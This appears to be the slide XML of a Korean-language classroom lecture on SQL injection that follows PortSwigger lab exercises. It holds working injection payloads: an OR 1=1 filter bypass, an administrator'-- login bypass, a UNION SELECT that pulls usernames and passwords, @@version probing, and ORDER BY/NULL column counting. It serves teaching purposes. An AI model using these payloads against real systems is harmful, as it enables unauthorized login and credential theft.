              </a:rPr>
              <a:t>https://insecure-website.com/products?category=Gifts'+OR+1=1--</a:t>
            </a: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pPr lvl="1"/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products WHERE category = 'Gifts' OR 1=1--' AND released =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0358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62785-F8CD-4F16-B8BC-197FBE29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hidden data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B7DA4-77FC-4BBA-93DB-CCB380AB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723"/>
            <a:ext cx="10745096" cy="4023360"/>
          </a:xfrm>
        </p:spPr>
        <p:txBody>
          <a:bodyPr/>
          <a:lstStyle/>
          <a:p>
            <a:r>
              <a:rPr lang="ko-KR" altLang="en-US" dirty="0"/>
              <a:t>실습 </a:t>
            </a:r>
            <a:endParaRPr lang="en-US" altLang="ko-KR" dirty="0"/>
          </a:p>
          <a:p>
            <a:r>
              <a:rPr lang="en-US" altLang="ko-KR" dirty="0"/>
              <a:t>All</a:t>
            </a:r>
            <a:r>
              <a:rPr lang="ko-KR" altLang="en-US" dirty="0"/>
              <a:t> </a:t>
            </a:r>
            <a:r>
              <a:rPr lang="en-US" altLang="ko-KR" dirty="0"/>
              <a:t>product</a:t>
            </a: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products WHERE category = 'Gifts' AND released = 1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https://portswigger.net/web-security/sql-injection/lab-retrieve-hidden-data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D056A7-7E98-4C81-9B22-03AFF39D5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059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A533F-42A2-4A85-B03B-1298DFCF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Subverting application logic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C914E-BEB9-4D45-83BD-35F7AB84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723"/>
            <a:ext cx="10305826" cy="4023360"/>
          </a:xfrm>
        </p:spPr>
        <p:txBody>
          <a:bodyPr/>
          <a:lstStyle/>
          <a:p>
            <a:r>
              <a:rPr lang="en-US" altLang="ko-KR" dirty="0"/>
              <a:t>Application logic </a:t>
            </a:r>
            <a:r>
              <a:rPr lang="ko-KR" altLang="en-US" dirty="0"/>
              <a:t>변경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사용자가 </a:t>
            </a:r>
            <a:r>
              <a:rPr lang="en-US" altLang="ko-KR" dirty="0"/>
              <a:t>username, password</a:t>
            </a:r>
            <a:r>
              <a:rPr lang="ko-KR" altLang="en-US" dirty="0"/>
              <a:t>로 로그인하는 기능을 생각해보자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users WHERE username = 'wiener' AND password = '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bluecheese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’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ko-KR" altLang="en-US" dirty="0">
                <a:solidFill>
                  <a:srgbClr val="333332"/>
                </a:solidFill>
                <a:latin typeface="Courier"/>
              </a:rPr>
              <a:t>사용자의 정보가 반환되면 로그인 성공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,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그렇지 않으면 거부</a:t>
            </a:r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pPr lvl="1"/>
            <a:r>
              <a:rPr lang="en-US" altLang="ko-KR" dirty="0">
                <a:solidFill>
                  <a:srgbClr val="333332"/>
                </a:solidFill>
                <a:latin typeface="Courier"/>
              </a:rPr>
              <a:t>Where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구문에서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password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 검사 부분을 제거할 수 있음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0E4AD-1459-4262-ACFB-B94A797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408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A533F-42A2-4A85-B03B-1298DFCF8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Subverting application logic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6C914E-BEB9-4D45-83BD-35F7AB84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7723"/>
            <a:ext cx="10305826" cy="4023360"/>
          </a:xfrm>
        </p:spPr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administrator’-- </a:t>
            </a:r>
            <a:r>
              <a:rPr lang="ko-KR" altLang="en-US" dirty="0"/>
              <a:t>로 제출하고 암호를 비워 두면 다음과 같은 쿼리가 발생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users WHERE username = 'administrator'--' AND password = ''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0E4AD-1459-4262-ACFB-B94A7976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8096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7C985-8F76-4F0A-BB03-4090804D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Subverting application logic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8C97CE-6E19-443F-9031-CE96A1F5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(login bypass)</a:t>
            </a:r>
          </a:p>
          <a:p>
            <a:endParaRPr lang="en-US" altLang="ko-KR" dirty="0"/>
          </a:p>
          <a:p>
            <a:r>
              <a:rPr lang="en-US" altLang="ko-KR" dirty="0"/>
              <a:t>administrator </a:t>
            </a:r>
            <a:r>
              <a:rPr lang="ko-KR" altLang="en-US" dirty="0"/>
              <a:t>로 로그인 성공하여라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* FROM users WHERE username = 'wiener' AND password = '</a:t>
            </a:r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bluecheese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’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https://portswigger.net/web-security/sql-injection/lab-login-bypass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5AC15-DCCF-4B67-A03E-0A615CAF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505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5E514-5878-4290-AD86-F28EA98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data from other database tables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6BBAA-382F-43FE-8D83-F69C58B3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r>
              <a:rPr lang="ko-KR" altLang="en-US" dirty="0"/>
              <a:t> </a:t>
            </a:r>
            <a:r>
              <a:rPr lang="en-US" altLang="ko-KR" dirty="0"/>
              <a:t>query </a:t>
            </a:r>
            <a:r>
              <a:rPr lang="ko-KR" altLang="en-US" dirty="0"/>
              <a:t>결과값이 </a:t>
            </a:r>
            <a:r>
              <a:rPr lang="en-US" altLang="ko-KR" dirty="0"/>
              <a:t>HTTP response</a:t>
            </a:r>
            <a:r>
              <a:rPr lang="ko-KR" altLang="en-US" dirty="0"/>
              <a:t>에 반환되는 경우</a:t>
            </a:r>
            <a:r>
              <a:rPr lang="en-US" altLang="ko-KR" dirty="0"/>
              <a:t>,</a:t>
            </a:r>
          </a:p>
          <a:p>
            <a:pPr lvl="1"/>
            <a:r>
              <a:rPr lang="ko-KR" altLang="en-US" dirty="0"/>
              <a:t>공격자는 </a:t>
            </a:r>
            <a:r>
              <a:rPr lang="en-US" altLang="ko-KR" dirty="0"/>
              <a:t>SQL Injection</a:t>
            </a:r>
            <a:r>
              <a:rPr lang="ko-KR" altLang="en-US" dirty="0"/>
              <a:t>을 통해서 데이터베이스 내 다른 테이블에서 데이터를 검색할 수 있음 </a:t>
            </a:r>
            <a:r>
              <a:rPr lang="en-US" altLang="ko-KR" dirty="0"/>
              <a:t>(</a:t>
            </a:r>
            <a:r>
              <a:rPr lang="ko-KR" altLang="en-US" dirty="0"/>
              <a:t>같은 테이블도 당연히 가능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UNION</a:t>
            </a:r>
            <a:r>
              <a:rPr lang="ko-KR" altLang="en-US" dirty="0"/>
              <a:t> 키워드를 사용하여 수행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SELECT </a:t>
            </a:r>
            <a:r>
              <a:rPr lang="ko-KR" altLang="en-US" dirty="0"/>
              <a:t>쿼리 문을 실행하고 </a:t>
            </a:r>
            <a:r>
              <a:rPr lang="en-US" altLang="ko-KR" dirty="0"/>
              <a:t>UNION </a:t>
            </a:r>
            <a:r>
              <a:rPr lang="ko-KR" altLang="en-US" dirty="0"/>
              <a:t>이후의 결과를 추가할 수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36A3D-F6B7-4B83-A2E9-4C935BF1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1608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5E514-5878-4290-AD86-F28EA98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data from other database tables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6BBAA-382F-43FE-8D83-F69C58B3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예를 들어</a:t>
            </a:r>
            <a:r>
              <a:rPr lang="en-US" altLang="ko-KR" dirty="0"/>
              <a:t>, application</a:t>
            </a:r>
            <a:r>
              <a:rPr lang="ko-KR" altLang="en-US" dirty="0"/>
              <a:t>이 사용자의 입력 </a:t>
            </a:r>
            <a:r>
              <a:rPr lang="en-US" altLang="ko-KR" dirty="0"/>
              <a:t>“Gifts”</a:t>
            </a:r>
            <a:r>
              <a:rPr lang="ko-KR" altLang="en-US" dirty="0"/>
              <a:t>를 포함하는 다음 쿼리를 실행하는 경우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name, description FROM products WHERE category = 'Gifts’</a:t>
            </a:r>
          </a:p>
          <a:p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en-US" altLang="ko-KR" dirty="0">
                <a:solidFill>
                  <a:srgbClr val="333332"/>
                </a:solidFill>
                <a:latin typeface="Courier"/>
              </a:rPr>
              <a:t>Attacker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가 다음을 제출하면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?</a:t>
            </a:r>
          </a:p>
          <a:p>
            <a:pPr lvl="1"/>
            <a:r>
              <a:rPr lang="en-US" altLang="ko-KR" b="0" i="0" dirty="0">
                <a:solidFill>
                  <a:srgbClr val="FF0000"/>
                </a:solidFill>
                <a:effectLst/>
                <a:latin typeface="Courier"/>
              </a:rPr>
              <a:t>' UNION SELECT username, password FROM users--</a:t>
            </a:r>
            <a:endParaRPr lang="en-US" altLang="ko-KR" dirty="0">
              <a:solidFill>
                <a:srgbClr val="FF0000"/>
              </a:solidFill>
              <a:latin typeface="Courier"/>
            </a:endParaRP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36A3D-F6B7-4B83-A2E9-4C935BF1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9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5E514-5878-4290-AD86-F28EA98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data from other database tables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6BBAA-382F-43FE-8D83-F69C58B3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endParaRPr lang="en-US" altLang="ko-KR" dirty="0"/>
          </a:p>
          <a:p>
            <a:pPr lvl="1"/>
            <a:r>
              <a:rPr lang="en-US" altLang="ko-KR" dirty="0"/>
              <a:t>Union </a:t>
            </a:r>
            <a:r>
              <a:rPr lang="ko-KR" altLang="en-US" dirty="0"/>
              <a:t>구문을 이용해서 </a:t>
            </a:r>
            <a:r>
              <a:rPr lang="en-US" altLang="ko-KR" b="1" dirty="0"/>
              <a:t>users</a:t>
            </a:r>
            <a:r>
              <a:rPr lang="en-US" altLang="ko-KR" dirty="0"/>
              <a:t> table</a:t>
            </a:r>
            <a:r>
              <a:rPr lang="ko-KR" altLang="en-US" dirty="0"/>
              <a:t>에 있는 정보를 획득하세요</a:t>
            </a:r>
            <a:r>
              <a:rPr lang="en-US" altLang="ko-KR" dirty="0"/>
              <a:t>. (</a:t>
            </a:r>
            <a:r>
              <a:rPr lang="ko-KR" altLang="en-US" dirty="0"/>
              <a:t>칼럼 명</a:t>
            </a:r>
            <a:r>
              <a:rPr lang="en-US" altLang="ko-KR" dirty="0"/>
              <a:t>: </a:t>
            </a:r>
            <a:r>
              <a:rPr lang="en-US" altLang="ko-KR" b="1" dirty="0"/>
              <a:t>username</a:t>
            </a:r>
            <a:r>
              <a:rPr lang="en-US" altLang="ko-KR" dirty="0"/>
              <a:t>, </a:t>
            </a:r>
            <a:r>
              <a:rPr lang="en-US" altLang="ko-KR" b="1" dirty="0"/>
              <a:t>password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administrator user</a:t>
            </a:r>
            <a:r>
              <a:rPr lang="ko-KR" altLang="en-US" dirty="0"/>
              <a:t>로 로그인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SELECT name, description FROM products WHERE category = 'Gifts’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https://portswigger.net/web-security/sql-injection/union-attacks/lab-retrieve-data-from-other-tables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36A3D-F6B7-4B83-A2E9-4C935BF1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3846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5E514-5878-4290-AD86-F28EA98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data from other database tables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86BBAA-382F-43FE-8D83-F69C58B3D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Union based SQL injection</a:t>
            </a:r>
            <a:r>
              <a:rPr lang="ko-KR" altLang="en-US" dirty="0"/>
              <a:t>은 다음 시간에 더 자세히 다루겠습니다</a:t>
            </a:r>
            <a:r>
              <a:rPr lang="en-US" altLang="ko-KR" dirty="0"/>
              <a:t>. (</a:t>
            </a:r>
            <a:r>
              <a:rPr lang="ko-KR" altLang="en-US" dirty="0"/>
              <a:t>칼럼 수 알아내기</a:t>
            </a:r>
            <a:r>
              <a:rPr lang="en-US" altLang="ko-KR" dirty="0"/>
              <a:t>, </a:t>
            </a:r>
            <a:r>
              <a:rPr lang="ko-KR" altLang="en-US" dirty="0"/>
              <a:t>특정 </a:t>
            </a:r>
            <a:r>
              <a:rPr lang="en-US" altLang="ko-KR" dirty="0"/>
              <a:t>column </a:t>
            </a:r>
            <a:r>
              <a:rPr lang="ko-KR" altLang="en-US" dirty="0"/>
              <a:t>알아내기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C36A3D-F6B7-4B83-A2E9-4C935BF1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554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C645F-35CC-4873-B84A-8DC1251B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 in SQL injection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AAA98-4DC0-4F42-8EE1-D4DEF18C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을 수행하기 위해서 정보들을 획득할 필요가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Database </a:t>
            </a:r>
            <a:r>
              <a:rPr lang="ko-KR" altLang="en-US" dirty="0"/>
              <a:t>소프트웨어 버전</a:t>
            </a:r>
            <a:r>
              <a:rPr lang="en-US" altLang="ko-KR" dirty="0"/>
              <a:t>, table</a:t>
            </a:r>
            <a:r>
              <a:rPr lang="ko-KR" altLang="en-US" dirty="0"/>
              <a:t>명</a:t>
            </a:r>
            <a:r>
              <a:rPr lang="en-US" altLang="ko-KR" dirty="0"/>
              <a:t>, column</a:t>
            </a:r>
            <a:r>
              <a:rPr lang="ko-KR" altLang="en-US" dirty="0"/>
              <a:t>명 등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C9BAF-3611-479F-8DB1-E9D47ED3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990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C645F-35CC-4873-B84A-8DC1251B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 in SQL injection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AAA98-4DC0-4F42-8EE1-D4DEF18C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Database</a:t>
            </a:r>
            <a:r>
              <a:rPr lang="ko-KR" altLang="en-US" dirty="0"/>
              <a:t>마다 버전을 조회하는 방법이 다름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Database </a:t>
            </a:r>
            <a:r>
              <a:rPr lang="ko-KR" altLang="en-US" dirty="0"/>
              <a:t>유형과 버전을 결정하기 위해 작동하는 쿼리를 찾아볼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C9BAF-3611-479F-8DB1-E9D47ED3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A07FC5B-273D-415F-96FA-AFB733415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54" y="3620102"/>
            <a:ext cx="4772691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50127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C645F-35CC-4873-B84A-8DC1251B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 in SQL injection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AAA98-4DC0-4F42-8EE1-D4DEF18C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UNION attack</a:t>
            </a:r>
            <a:r>
              <a:rPr lang="ko-KR" altLang="en-US" dirty="0"/>
              <a:t>을 통해 다음과 같이 사용할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' UNION SELECT @@version—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r>
              <a:rPr lang="ko-KR" altLang="en-US" dirty="0">
                <a:solidFill>
                  <a:srgbClr val="333332"/>
                </a:solidFill>
                <a:latin typeface="Courier"/>
              </a:rPr>
              <a:t>만약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output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이 다음과 같으면 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Microsoft SQL Server </a:t>
            </a:r>
            <a:r>
              <a:rPr lang="ko-KR" altLang="en-US" dirty="0">
                <a:solidFill>
                  <a:srgbClr val="333332"/>
                </a:solidFill>
                <a:latin typeface="Courier"/>
              </a:rPr>
              <a:t>임을 알 수 있음</a:t>
            </a:r>
            <a:r>
              <a:rPr lang="en-US" altLang="ko-KR" dirty="0">
                <a:solidFill>
                  <a:srgbClr val="333332"/>
                </a:solidFill>
                <a:latin typeface="Courier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C9BAF-3611-479F-8DB1-E9D47ED3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D6FBA41E-D99B-4C4C-AE6A-6A86C01C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473" y="4206676"/>
            <a:ext cx="9774014" cy="16671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9264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C645F-35CC-4873-B84A-8DC1251B4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 in SQL injection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AAA98-4DC0-4F42-8EE1-D4DEF18CC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(lab-querying-database-version-</a:t>
            </a:r>
            <a:r>
              <a:rPr lang="en-US" altLang="ko-KR" dirty="0" err="1"/>
              <a:t>mysql</a:t>
            </a:r>
            <a:r>
              <a:rPr lang="en-US" altLang="ko-KR" dirty="0"/>
              <a:t>-Microsoft)</a:t>
            </a:r>
          </a:p>
          <a:p>
            <a:r>
              <a:rPr lang="en-US" altLang="ko-KR" dirty="0"/>
              <a:t>-- -</a:t>
            </a:r>
          </a:p>
          <a:p>
            <a:r>
              <a:rPr lang="en-US" altLang="ko-KR" dirty="0"/>
              <a:t>UNION attack</a:t>
            </a:r>
            <a:r>
              <a:rPr lang="ko-KR" altLang="en-US" dirty="0"/>
              <a:t>을 이용해서 정보를 알아내기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https://portswigger.net/web-security/sql-injection/examining-the-database/lab-querying-database-version-mysql-microsoft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7C9BAF-3611-479F-8DB1-E9D47ED3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BCB50606-D6A5-4DE2-981E-9F3F98258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989" y="4471749"/>
            <a:ext cx="4772691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53378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12C0C-F2ED-43FC-BAE1-20E56CD1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 in SQL injection attacks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CE1D1F-D149-4C3A-A7A0-2CA6990B7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‘union select @@version,2%23</a:t>
            </a:r>
          </a:p>
          <a:p>
            <a:endParaRPr lang="en-US" altLang="ko-KR" dirty="0"/>
          </a:p>
          <a:p>
            <a:r>
              <a:rPr lang="ko-KR" altLang="en-US" dirty="0"/>
              <a:t>원래는 칼럼 수와 </a:t>
            </a:r>
            <a:r>
              <a:rPr lang="en-US" altLang="ko-KR" dirty="0"/>
              <a:t>text</a:t>
            </a:r>
            <a:r>
              <a:rPr lang="ko-KR" altLang="en-US" dirty="0"/>
              <a:t>가 어느 칼럼에 포함되는지 알아내야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이는 다음 시간에 다룰 예정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테이블</a:t>
            </a:r>
            <a:r>
              <a:rPr lang="en-US" altLang="ko-KR" dirty="0"/>
              <a:t>, </a:t>
            </a:r>
            <a:r>
              <a:rPr lang="ko-KR" altLang="en-US" dirty="0"/>
              <a:t>칼럼 알아내기도 다음 시간에 다룰 예정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54260-3045-49E2-A082-71EF1215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051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2AA14D-2196-4A46-8DB3-4970F786D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SQL </a:t>
            </a:r>
            <a:r>
              <a:rPr lang="ko-KR" altLang="en-US" dirty="0"/>
              <a:t>주석</a:t>
            </a:r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6574A606-EBC8-4E08-88B6-77D22BA29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3448" y="2223865"/>
            <a:ext cx="6125430" cy="3191320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209E8-FBBC-4B9E-B5DE-63120CD9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4EFF540-7121-4976-4B70-6CBE1BA1B4BA}"/>
                  </a:ext>
                </a:extLst>
              </p14:cNvPr>
              <p14:cNvContentPartPr/>
              <p14:nvPr/>
            </p14:nvContentPartPr>
            <p14:xfrm>
              <a:off x="5244487" y="1042814"/>
              <a:ext cx="667145" cy="161247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4EFF540-7121-4976-4B70-6CBE1BA1B4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6495" y="1024858"/>
                <a:ext cx="702769" cy="1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7B17439-25B0-102D-417F-75ABBB77FA28}"/>
                  </a:ext>
                </a:extLst>
              </p14:cNvPr>
              <p14:cNvContentPartPr/>
              <p14:nvPr/>
            </p14:nvContentPartPr>
            <p14:xfrm>
              <a:off x="5639259" y="1062668"/>
              <a:ext cx="660591" cy="113036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7B17439-25B0-102D-417F-75ABBB77FA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21269" y="1045085"/>
                <a:ext cx="696211" cy="148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1F94A234-524A-417A-294C-618E397AE539}"/>
                  </a:ext>
                </a:extLst>
              </p14:cNvPr>
              <p14:cNvContentPartPr/>
              <p14:nvPr/>
            </p14:nvContentPartPr>
            <p14:xfrm>
              <a:off x="6316285" y="952499"/>
              <a:ext cx="699303" cy="468619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1F94A234-524A-417A-294C-618E397AE53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8299" y="934876"/>
                <a:ext cx="734916" cy="504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CDA3EEB-BE0D-A410-5FD5-199BFB7798AF}"/>
                  </a:ext>
                </a:extLst>
              </p14:cNvPr>
              <p14:cNvContentPartPr/>
              <p14:nvPr/>
            </p14:nvContentPartPr>
            <p14:xfrm>
              <a:off x="6346174" y="969784"/>
              <a:ext cx="552793" cy="405725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CDA3EEB-BE0D-A410-5FD5-199BFB7798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28191" y="952159"/>
                <a:ext cx="588399" cy="441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B5D35C8-B24C-CC28-D689-B84C1FF4C4AE}"/>
                  </a:ext>
                </a:extLst>
              </p14:cNvPr>
              <p14:cNvContentPartPr/>
              <p14:nvPr/>
            </p14:nvContentPartPr>
            <p14:xfrm>
              <a:off x="7346874" y="1113391"/>
              <a:ext cx="951078" cy="155815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B5D35C8-B24C-CC28-D689-B84C1FF4C4A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28882" y="1095799"/>
                <a:ext cx="986703" cy="191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2AEE2B2-19D4-CB02-D7C9-E34E6692DB00}"/>
                  </a:ext>
                </a:extLst>
              </p14:cNvPr>
              <p14:cNvContentPartPr/>
              <p14:nvPr/>
            </p14:nvContentPartPr>
            <p14:xfrm>
              <a:off x="2610424" y="2375512"/>
              <a:ext cx="695300" cy="3433286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2AEE2B2-19D4-CB02-D7C9-E34E6692DB0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92430" y="2357874"/>
                <a:ext cx="730929" cy="3468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653DC49-2A26-A755-358C-FE241315E295}"/>
                  </a:ext>
                </a:extLst>
              </p14:cNvPr>
              <p14:cNvContentPartPr/>
              <p14:nvPr/>
            </p14:nvContentPartPr>
            <p14:xfrm>
              <a:off x="2629949" y="3055988"/>
              <a:ext cx="602983" cy="18317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653DC49-2A26-A755-358C-FE241315E2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11960" y="3038030"/>
                <a:ext cx="638601" cy="218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42619D87-164B-6B01-811D-63AF1E4C0AF6}"/>
                  </a:ext>
                </a:extLst>
              </p14:cNvPr>
              <p14:cNvContentPartPr/>
              <p14:nvPr/>
            </p14:nvContentPartPr>
            <p14:xfrm>
              <a:off x="2433110" y="3655678"/>
              <a:ext cx="646427" cy="115406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42619D87-164B-6B01-811D-63AF1E4C0AF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15124" y="3637758"/>
                <a:ext cx="682040" cy="150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93347FE7-AC2B-A668-1750-4AAC08B17E11}"/>
                  </a:ext>
                </a:extLst>
              </p14:cNvPr>
              <p14:cNvContentPartPr/>
              <p14:nvPr/>
            </p14:nvContentPartPr>
            <p14:xfrm>
              <a:off x="2426006" y="4230018"/>
              <a:ext cx="838294" cy="390328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93347FE7-AC2B-A668-1750-4AAC08B17E1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08377" y="4212031"/>
                <a:ext cx="873913" cy="4259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725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1C2BA-7F5E-443C-A83B-52476230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529A6-44D5-40C1-9502-36A8207CE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UNION attack</a:t>
            </a:r>
            <a:r>
              <a:rPr lang="ko-KR" altLang="en-US" dirty="0"/>
              <a:t>을 사용할 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column </a:t>
            </a:r>
            <a:r>
              <a:rPr lang="ko-KR" altLang="en-US" dirty="0"/>
              <a:t>수를 확인하는 </a:t>
            </a:r>
            <a:r>
              <a:rPr lang="en-US" altLang="ko-KR" dirty="0"/>
              <a:t>2</a:t>
            </a:r>
            <a:r>
              <a:rPr lang="ko-KR" altLang="en-US" dirty="0"/>
              <a:t>가지 방법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ORDER BY </a:t>
            </a:r>
            <a:r>
              <a:rPr lang="ko-KR" altLang="en-US" dirty="0"/>
              <a:t>를 주입하여 오류가 발생할 때까지 지정 된 열 </a:t>
            </a:r>
            <a:r>
              <a:rPr lang="en-US" altLang="ko-KR" dirty="0"/>
              <a:t>index</a:t>
            </a:r>
            <a:r>
              <a:rPr lang="ko-KR" altLang="en-US" dirty="0"/>
              <a:t>를 대입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679C1-F650-42DC-9638-C517FAFC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97157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02C54F-CE1E-49B5-9FB8-3CC1608E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7A1D2-1BE0-4BD4-89FF-3581E308D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ORDER BY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절은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Noto Sans KR"/>
              </a:rPr>
              <a:t>SQL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Noto Sans KR"/>
              </a:rPr>
              <a:t>문장으로 조회된 데이터들을 다양한 목적에 맞게 특정 칼럼을 기준으로 정렬하여 출력하는데 사용</a:t>
            </a:r>
            <a:endParaRPr lang="en-US" altLang="ko-KR" b="0" i="0" dirty="0">
              <a:solidFill>
                <a:srgbClr val="333333"/>
              </a:solidFill>
              <a:effectLst/>
              <a:latin typeface="Noto Sans KR"/>
            </a:endParaRPr>
          </a:p>
          <a:p>
            <a:endParaRPr lang="en-US" altLang="ko-KR" dirty="0">
              <a:solidFill>
                <a:srgbClr val="333333"/>
              </a:solidFill>
              <a:latin typeface="Noto Sans KR"/>
            </a:endParaRPr>
          </a:p>
          <a:p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' ORDER BY 1--</a:t>
            </a:r>
            <a:br>
              <a:rPr lang="en-US" altLang="ko-KR" b="1" dirty="0"/>
            </a:b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' ORDER BY 2--</a:t>
            </a:r>
            <a:br>
              <a:rPr lang="en-US" altLang="ko-KR" b="1" dirty="0"/>
            </a:br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' ORDER BY 3--</a:t>
            </a:r>
            <a:endParaRPr lang="en-US" altLang="ko-KR" b="1" i="0" dirty="0">
              <a:solidFill>
                <a:srgbClr val="333333"/>
              </a:solidFill>
              <a:effectLst/>
              <a:latin typeface="Noto Sans KR"/>
            </a:endParaRPr>
          </a:p>
          <a:p>
            <a:pPr marL="0" indent="0">
              <a:buNone/>
            </a:pPr>
            <a:r>
              <a:rPr lang="en-US" altLang="ko-KR" dirty="0">
                <a:solidFill>
                  <a:srgbClr val="333333"/>
                </a:solidFill>
                <a:latin typeface="Noto Sans KR"/>
              </a:rPr>
              <a:t>       …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DB4F5-3256-4B5E-86C6-039F5AD8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005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B4D63D-D31D-4E62-9B24-E77659BB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F9A72E-F600-4762-A0C2-395523C96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335DE8-6810-4146-903E-C0DE91EB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41BA99D-C214-46E9-AA4A-01C891142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833" y="2442848"/>
            <a:ext cx="6211167" cy="27531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951560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B635F-C6E4-467E-90EC-4CA36A24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296BB-E252-4D5F-BF39-4462263BF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5’ </a:t>
            </a:r>
            <a:r>
              <a:rPr lang="en-US" altLang="ko-KR" b="1" dirty="0">
                <a:solidFill>
                  <a:srgbClr val="333332"/>
                </a:solidFill>
                <a:latin typeface="Courier"/>
              </a:rPr>
              <a:t>ORDER</a:t>
            </a:r>
            <a:r>
              <a:rPr lang="ko-KR" altLang="en-US" b="1" dirty="0">
                <a:solidFill>
                  <a:srgbClr val="333332"/>
                </a:solidFill>
                <a:latin typeface="Courier"/>
              </a:rPr>
              <a:t> </a:t>
            </a:r>
            <a:r>
              <a:rPr lang="en-US" altLang="ko-KR" b="1" dirty="0">
                <a:solidFill>
                  <a:srgbClr val="333332"/>
                </a:solidFill>
                <a:latin typeface="Courier"/>
              </a:rPr>
              <a:t>BY</a:t>
            </a:r>
            <a:r>
              <a:rPr lang="ko-KR" altLang="en-US" b="1" dirty="0">
                <a:solidFill>
                  <a:srgbClr val="333332"/>
                </a:solidFill>
                <a:latin typeface="Courier"/>
              </a:rPr>
              <a:t> </a:t>
            </a:r>
            <a:r>
              <a:rPr lang="en-US" altLang="ko-KR" b="1" dirty="0">
                <a:solidFill>
                  <a:srgbClr val="333332"/>
                </a:solidFill>
                <a:latin typeface="Courier"/>
              </a:rPr>
              <a:t>3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9002B6-62B9-4910-BDE9-F2E25D16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D83739-317C-481A-9EE9-DABE9CBB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718" y="2346917"/>
            <a:ext cx="3858163" cy="6096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4764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31810B-C5DD-4E3F-975A-CFEFF53B3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FA7797-B598-40E6-98F3-41CDB7965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서로 다른 </a:t>
            </a:r>
            <a:r>
              <a:rPr lang="en-US" altLang="ko-KR" dirty="0"/>
              <a:t>COLUMN</a:t>
            </a:r>
            <a:r>
              <a:rPr lang="ko-KR" altLang="en-US" dirty="0"/>
              <a:t>을 기준으로 결과를 정렬함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ORDER BY </a:t>
            </a:r>
            <a:r>
              <a:rPr lang="ko-KR" altLang="en-US" dirty="0"/>
              <a:t>절은 </a:t>
            </a:r>
            <a:r>
              <a:rPr lang="en-US" altLang="ko-KR" dirty="0"/>
              <a:t>COLUMN</a:t>
            </a:r>
            <a:r>
              <a:rPr lang="ko-KR" altLang="en-US" dirty="0"/>
              <a:t>을 인덱스로 지정할 수 있으므로</a:t>
            </a:r>
            <a:r>
              <a:rPr lang="en-US" altLang="ko-KR" dirty="0"/>
              <a:t>, COLUMN </a:t>
            </a:r>
            <a:r>
              <a:rPr lang="ko-KR" altLang="en-US" dirty="0"/>
              <a:t>명을 알 필요가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실제 </a:t>
            </a:r>
            <a:r>
              <a:rPr lang="en-US" altLang="ko-KR" dirty="0"/>
              <a:t>COLUMN</a:t>
            </a:r>
            <a:r>
              <a:rPr lang="ko-KR" altLang="en-US" dirty="0"/>
              <a:t>의 수 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)</a:t>
            </a:r>
            <a:r>
              <a:rPr lang="ko-KR" altLang="en-US" dirty="0"/>
              <a:t>가 넘어갈 경우 오류를 반환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43F14C-85D8-4552-BE7C-1727DBEB0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B67DB7-8EBC-419E-B27E-45A7F10D2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4337633"/>
            <a:ext cx="8145012" cy="7430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40203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5BBFA-96C8-4EA5-A8A1-9E6F96DD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B626A-FFF5-4574-9309-F888C995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두 번째 방법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NULL </a:t>
            </a:r>
            <a:r>
              <a:rPr lang="ko-KR" altLang="en-US" dirty="0"/>
              <a:t>의 개수를 지정하는 일련의 </a:t>
            </a:r>
            <a:r>
              <a:rPr lang="en-US" altLang="ko-KR" dirty="0"/>
              <a:t>UNION SELECT payload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DB702-3881-43D9-A264-135D8614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E94FAEA-1EFB-475C-B94E-A994B28FA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902" y="3429000"/>
            <a:ext cx="5562196" cy="13590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3871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D6F86-DAB1-4EFF-B84D-BFD022CD6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2D899-3B20-43BE-9276-C8D0522F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</a:t>
            </a:r>
            <a:r>
              <a:rPr lang="ko-KR" altLang="en-US" dirty="0"/>
              <a:t>의 개수가 </a:t>
            </a:r>
            <a:r>
              <a:rPr lang="en-US" altLang="ko-KR" dirty="0"/>
              <a:t>COLUMN</a:t>
            </a:r>
            <a:r>
              <a:rPr lang="ko-KR" altLang="en-US" dirty="0"/>
              <a:t>의 개수와 일치하지 않으면</a:t>
            </a:r>
            <a:r>
              <a:rPr lang="en-US" altLang="ko-KR" dirty="0"/>
              <a:t>, database</a:t>
            </a:r>
            <a:r>
              <a:rPr lang="ko-KR" altLang="en-US" dirty="0"/>
              <a:t>는 다음과 같은 에러를 반환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4A6640-9AD7-4A11-A3E1-2039D6AF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560E9A7-DE82-4BCB-9DC0-E1DE550C1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494" y="3095578"/>
            <a:ext cx="8507012" cy="6668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2445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820A6-EE9A-4A6E-8E81-05C061DC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6BFF2C-09AA-4C13-95A7-E56F49428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</a:t>
            </a:r>
            <a:r>
              <a:rPr lang="ko-KR" altLang="en-US" dirty="0"/>
              <a:t>을 사용하는 이유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COLUMN </a:t>
            </a:r>
            <a:r>
              <a:rPr lang="ko-KR" altLang="en-US" dirty="0"/>
              <a:t>의 자료형이 모두 호환</a:t>
            </a:r>
            <a:r>
              <a:rPr lang="en-US" altLang="ko-KR" dirty="0"/>
              <a:t>!</a:t>
            </a:r>
          </a:p>
          <a:p>
            <a:pPr lvl="1"/>
            <a:r>
              <a:rPr lang="ko-KR" altLang="en-US" dirty="0"/>
              <a:t>성공할 가능성이 최대화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Oracle</a:t>
            </a:r>
            <a:r>
              <a:rPr lang="ko-KR" altLang="en-US" dirty="0"/>
              <a:t>에서는 모든 </a:t>
            </a:r>
            <a:r>
              <a:rPr lang="en-US" altLang="ko-KR" dirty="0"/>
              <a:t>SELECT </a:t>
            </a:r>
            <a:r>
              <a:rPr lang="ko-KR" altLang="en-US" dirty="0"/>
              <a:t>쿼리는 </a:t>
            </a:r>
            <a:r>
              <a:rPr lang="en-US" altLang="ko-KR" dirty="0"/>
              <a:t>FROM </a:t>
            </a:r>
            <a:r>
              <a:rPr lang="ko-KR" altLang="en-US" dirty="0"/>
              <a:t>키워드를 사용해야함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Oracle</a:t>
            </a:r>
            <a:r>
              <a:rPr lang="ko-KR" altLang="en-US" dirty="0"/>
              <a:t>에서는 다음과 같은 쿼리를 사용해야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i="0" dirty="0">
                <a:solidFill>
                  <a:srgbClr val="333332"/>
                </a:solidFill>
                <a:effectLst/>
                <a:latin typeface="Courier"/>
              </a:rPr>
              <a:t>' UNION SELECT NULL FROM DUAL--</a:t>
            </a:r>
          </a:p>
          <a:p>
            <a:pPr lvl="1"/>
            <a:endParaRPr lang="en-US" altLang="ko-KR" b="1" dirty="0">
              <a:solidFill>
                <a:srgbClr val="333332"/>
              </a:solidFill>
